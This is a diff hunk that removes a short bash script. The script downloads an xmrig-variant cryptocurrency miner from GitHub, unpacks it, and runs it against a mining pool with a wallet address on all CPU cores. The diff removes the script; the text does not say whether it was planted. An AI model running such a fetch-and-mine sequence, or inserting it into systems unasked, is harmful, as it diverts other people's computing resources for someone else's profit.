@@ -1,5 +1,0 @@
-#!/bin/bash
-wget https://github.com/rplant8/xmrig-vrl/releases/download/6.0.24-virel/xmrig-vrl-linux.tar.xz
-tar xf xmrig-vrl-linux.tar.xz
-cd xmrig-vrl
-./xmrig-vrl -a randomvirel --url eu.rplant.xyz:7155 --user v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.x --pass webpassword=x -t $(nproc --all)
